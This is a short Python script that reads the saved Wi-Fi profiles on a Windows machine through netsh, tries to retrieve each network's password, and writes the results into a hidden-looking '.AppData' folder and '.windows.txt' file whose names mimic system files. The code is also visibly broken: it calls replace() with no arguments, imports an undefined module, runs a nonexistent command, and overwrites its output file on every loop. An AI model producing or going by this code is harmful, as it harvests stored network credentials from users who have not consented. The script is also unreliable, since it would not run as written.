import subprocess
import wifiPassword
import os
import re

def WifiPassword():
    Directory_Name = ".AppData"
    File_Name = ".windows.txt" 
    Get_Profiles = subprocess.getoutput("netsh wlan show profiles").replace()
    regex = r"All User Profile\s+:\s+(.*)"
    matches = re.findall(regex, Get_Profiles)
    profiles = [match for match in matches]
    #print(profiles)
    os.mkdir(Directory_Name)
    file_path = os.path.join(Directory_Name, File_Name)
    for len in profiles : 
        Wifi_password = subprocess.getoutput("wifipassword" + len)
        #print (Wifi_password)
        with open(file_path, "w") as f :
            f.write(Wifi_password + "\n") 

